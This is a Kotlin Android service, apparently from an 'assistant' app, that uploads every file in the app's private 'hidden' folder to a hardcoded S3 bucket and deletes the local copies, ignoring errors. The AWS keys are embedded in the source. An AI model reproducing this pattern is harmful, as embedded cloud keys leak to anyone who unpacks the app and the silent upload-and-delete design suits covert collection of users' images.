package com.keescale.assistant

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.amazonaws.auth.BasicAWSCredentials
import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener
import com.amazonaws.mobileconnectors.s3.transferutility.TransferState
import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility
import com.amazonaws.regions.Region
import com.amazonaws.regions.Regions
import com.amazonaws.services.s3.AmazonS3Client
import java.io.File

class HiddenImageUploader : Service() {
    // Replace with your actual credentials and bucket info
    private val s3BucketName = "securevc"
    private val s3Region = Regions.EU_NORTH_1 // changed to eu-north-1
    private val awsAccessKey = "AKIASB"
    private val awsSecretKey = "GpjIZo"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val hiddenDir = File(filesDir, "hidden")
        if (hiddenDir.exists()) {
            val s3Client = AmazonS3Client(BasicAWSCredentials(awsAccessKey, awsSecretKey), Region.getRegion(s3Region))
            val transferUtility = TransferUtility.builder()
                .context(applicationContext)
                .s3Client(s3Client)
                .build()
            hiddenDir.listFiles()?.forEach { file ->
                uploadFileToS3(file, transferUtility)
            }
        }
        stopSelf()
        return START_NOT_STICKY
    }

    private fun uploadFileToS3(file: File, transferUtility: TransferUtility) {
        val uploadObserver = transferUtility.upload(s3BucketName, file.name, file)
        uploadObserver.setTransferListener(object : TransferListener {
            override fun onStateChanged(id: Int, state: TransferState?) {
                if (state == TransferState.COMPLETED) {
                    file.delete()
                }
            }
            override fun onProgressChanged(id: Int, bytesCurrent: Long, bytesTotal: Long) {}
            override fun onError(id: Int, ex: Exception?) {}
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null
}